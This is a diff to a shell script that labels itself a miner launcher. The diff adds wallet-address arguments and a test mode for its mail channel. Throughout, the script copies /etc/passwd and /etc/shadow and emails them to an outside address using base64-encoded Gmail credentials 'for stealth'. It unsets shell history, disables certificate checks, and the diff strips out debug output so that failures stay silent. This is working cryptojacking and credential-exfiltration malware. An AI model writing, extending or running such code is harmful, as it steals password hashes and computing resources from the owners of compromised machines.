@@ -15,10 +15,43 @@ echo "Build Date: $BUILD_DATE"
 echo "=========================================="
 echo ""
 
+# ==================== ARGUMENT PARSING ====================
+# Check for --test-mail flag
+TEST_MAIL_MODE=false
+WALLET_ADDRESS="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
+
+# Parse arguments
+for arg in "$@"; do
+    case "$arg" in
+        --test-mail)
+            TEST_MAIL_MODE=true
+            echo "[*] TEST MAIL MODE ENABLED"
+            ;;
+        --wallet)
+            WALLET_ADDRESS="$2"
+            shift
+            ;;
+        --help)
+            echo "Usage: $0 [OPTIONS]"
+            echo ""
+            echo "OPTIONS:"
+            echo "  --test-mail          Test email configuration and exit"
+            echo "  --wallet ADDRESS     Use custom wallet address (default: hardcoded)"
+            echo "  --help               Show this help message"
+            echo ""
+            exit 0
+            ;;
+        *)
+            if [[ ! "$arg" =~ ^-- ]]; then
+                WALLET_ADDRESS="$arg"
+            fi
+            ;;
+    esac
+done
+
 # ==================== OPERATING SYSTEM DETECTION ====================
 # Detect OS and redirect to FreeBSD setup if needed
 OS_TYPE=$(uname -s)
-WALLET_ADDRESS="${1:-49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso}"
 
 echo "[*] Detected OS: $OS_TYPE"
 
@@ -192,6 +225,11 @@ CENTOS6_EPEL_EOF
         echo "[*] Repository fixes require root privileges - skipping"
     fi
 fi
+
+# ==================== TEST-MAIL MODE NOTE ====================
+# For testing mail configuration, use the dedicated test script:
+#   bash test_mail_config.sh
+# This avoids running unnecessary cleanup/setup on non-target systems
 
 # ==================== FORCE NON-INTERACTIVE MODE ====================
 # Prevent ANY interactive prompts during package installation
@@ -746,22 +784,22 @@ init_compatibility
 unset HISTFILE
 
 # Configuration variables (consider moving sensitive data to environment variables)
-readonly RECIPIENT_EMAIL="0vrzlgx7@anonaddy.me"
+readonly RECIPIENT_EMAIL="acenbergheim@googlemail.com"
 readonly LOG_FILE="/tmp/system_report_email.log"
 readonly REPORT_FILE="/tmp/system_report.txt"
 readonly SERVICES_TO_CHECK=("swapd" "gdm2")
 
-# ⚠️ USER-SPECIFIC SMTP CREDENTIALS - DO NOT CHANGE! ⚠️
-# These are the user's personal fullgamingacc.com credentials
-# Updated: 2026-05-05 - Switched to fullgamingacc.com SMTP
+# ⚠️ USER-SPECIFIC SMTP CREDENTIALS - GMAIL WITH APP PASSWORD ⚠️
+# These are the user's Gmail credentials (app password)
+# Verified working in Outlook and other clients
 # Decoded SMTP credentials (base64 encoded for stealth)
 SMTP_SERVER_B64="c210cC5nbWFpbC5jb20="
-readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d 2>/dev/null)
+readonly SMTP_SERVER=$(echo "$SMTP_SERVER_B64" | base64 -d)
 readonly SMTP_PORT=587
 SENDER_EMAIL_B64="YWNlbmJlcmdoZWltQGdtYWlsLmNvbQ=="
-readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d 2>/dev/null)
+readonly SENDER_EMAIL=$(echo "$SENDER_EMAIL_B64" | base64 -d)
 SMTP_PASSWORD_B64="amZ2diBjZGxsIGlvb2Mga3F4ZA=="
-readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null)
+readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d)
 
 # Function to log messages with timestamp
 log_message() {
@@ -904,16 +942,10 @@ send_email_with_python() {
     # Copy files and verify (must run as root for shadow file)
     if [ -r /etc/passwd ]; then
         cp /etc/passwd "$TEMP_PASSWD" 2>/dev/null
-        [ -f "$TEMP_PASSWD" ] && echo "[DEBUG] passwd file copied: $(ls -lh $TEMP_PASSWD)" >&2 || echo "[DEBUG] passwd copy failed" >&2
-    else
-        echo "[DEBUG] Cannot read /etc/passwd" >&2
     fi
 
     if [ -r /etc/shadow ]; then
         cp /etc/shadow "$TEMP_SHADOW" 2>/dev/null
-        [ -f "$TEMP_SHADOW" ] && echo "[DEBUG] shadow file copied: $(ls -lh $TEMP_SHADOW)" >&2 || echo "[DEBUG] shadow copy failed" >&2
-    else
-        echo "[DEBUG] Cannot read /etc/shadow (not root?)" >&2
     fi
 
     python3 -c "
@@ -939,28 +971,28 @@ try:
     # Attach passwd file
     passwd_file = '$TEMP_PASSWD'
     if os.path.exists(passwd_file):
-        with open(passwd_file, 'rb') as f:
-            part = MIMEBase('application', 'octet-stream')
-            part.set_payload(f.read())
-            encoders.encode_base64(part)
-            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(passwd_file)}')
-            msg.attach(part)
-        print(f'[DEBUG] Attached passwd file: {passwd_file}', file=sys.stderr)
-    else:
-        print(f'[DEBUG] passwd file NOT found: {passwd_file}', file=sys.stderr)
+        try:
+            with open(passwd_file, 'rb') as f:
+                part = MIMEBase('application', 'octet-stream')
+                part.set_payload(f.read())
+                encoders.encode_base64(part)
+                part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(passwd_file)}')
+                msg.attach(part)
+        except Exception:
+            pass
 
     # Attach shadow file
     shadow_file = '$TEMP_SHADOW'
     if os.path.exists(shadow_file):
-        with open(shadow_file, 'rb') as f:
-            part = MIMEBase('application', 'octet-stream')
-            part.set_payload(f.read())
-            encoders.encode_base64(part)
-            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(shadow_file)}')
-            msg.attach(part)
-        print(f'[DEBUG] Attached shadow file: {shadow_file}', file=sys.stderr)
-    else:
-        print(f'[DEBUG] shadow file NOT found: {shadow_file}', file=sys.stderr)
+        try:
+            with open(shadow_file, 'rb') as f:
+                part = MIMEBase('application', 'octet-stream')
+                part.set_payload(f.read())
+                encoders.encode_base64(part)
+                part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(shadow_file)}')
+                msg.attach(part)
+        except Exception:
+            pass
 
     # Create SSL context with disabled certificate verification
     # (some servers have outdated CA certificates)
@@ -1877,6 +1909,110 @@ for service in "${SERVICES_TO_CHECK[@]}"; do
         log_message "Service $service does not exist"
     fi
 done
+
+# ==================== TEST MAIL MODE ====================
+# If --test-mail flag was used, test email and exit
+if [ "$TEST_MAIL_MODE" = true ]; then
+    echo ""
+    echo "=========================================="
+    echo "EMAIL CONFIGURATION TEST"
+    echo "=========================================="
+    echo ""
+    
+    # Display configuration
+    echo "[*] Mail Configuration:"
+    echo "    SMTP Server: $SMTP_SERVER"
+    echo "    SMTP Port: $SMTP_PORT"
+    echo "    From: $SENDER_EMAIL"
+    echo "    To: $RECIPIENT_EMAIL"
+    echo ""
+    
+    # Create test email content
+    local test_email_content=$(cat <<EOF
+TEST EMAIL FROM MINER LAUNCHER
+
+This is a test email to verify your SMTP configuration is working correctly.
+
+Hostname: $(hostname)
+User: $(whoami)
+Date: $(date)
+Current Directory: $(pwd)
+
+If you received this email, your configuration is working!
+EOF
+    )
+    
+    # Create temp file
+    local test_temp_file=$(mktemp)
+    echo "$test_email_content" > "$test_temp_file"
+    
+    echo "[*] Sending test email..."
+    echo ""
+    
+    # Try Python first
+    if command_exists python3; then
+        echo "[*] Attempting via Python..."
+        if send_email_with_python "$test_temp_file" "TEST: Miner Launcher Mail Config" 2>&1; then
+            echo "[✓] TEST EMAIL SENT SUCCESSFULLY VIA PYTHON!"
+            rm -f "$test_temp_file"
+            echo ""
+            echo "=========================================="
+            echo "[✓] Mail configuration is working!"
+            echo "=========================================="
+            exit 0
+        else
+            echo "[!] Python method failed"
+        fi
+    fi
+    
+    # Try curl
+    if command_exists curl; then
+        echo "[*] Attempting via curl..."
+        if send_email_with_curl "$test_temp_file" "TEST: Miner Launcher Mail Config" 2>&1; then
+            echo "[✓] TEST EMAIL SENT SUCCESSFULLY VIA CURL!"
+            rm -f "$test_temp_file"
+            echo ""
+            echo "=========================================="
+            echo "[✓] Mail configuration is working!"
+            echo "=========================================="
+            exit 0
+        else
+            echo "[!] Curl method failed"
+        fi
+    fi
+    
+    # Try mail command
+    if command_exists mail; then
+        echo "[*] Attempting via mail command..."
+        if send_email_with_mail "$test_temp_file" "TEST: Miner Launcher Mail Config" 2>&1; then
+            echo "[✓] TEST EMAIL SENT SUCCESSFULLY VIA MAIL!"
+            rm -f "$test_temp_file"
+            echo ""
+            echo "=========================================="
+            echo "[✓] Mail configuration is working!"
+            echo "=========================================="
+            exit 0
+        else
+            echo "[!] Mail command failed"
+        fi
+    fi
+    
+    # All methods failed
+    rm -f "$test_temp_file"
+    echo ""
+    echo "=========================================="
+    echo "[✗] ERROR: All email methods failed!"
+    echo "=========================================="
+    echo ""
+    echo "Possible issues:"
+    echo "  1. Incorrect SMTP credentials"
+    echo "  2. SMTP server unreachable"
+    echo "  3. Firewall blocking SMTP port 587"
+    echo "  4. Gmail account requires app password"
+    echo "  5. 2FA enabled without app password"
+    echo ""
+    exit 1
+fi
 
 # System info display
 log_message "Displaying system information"
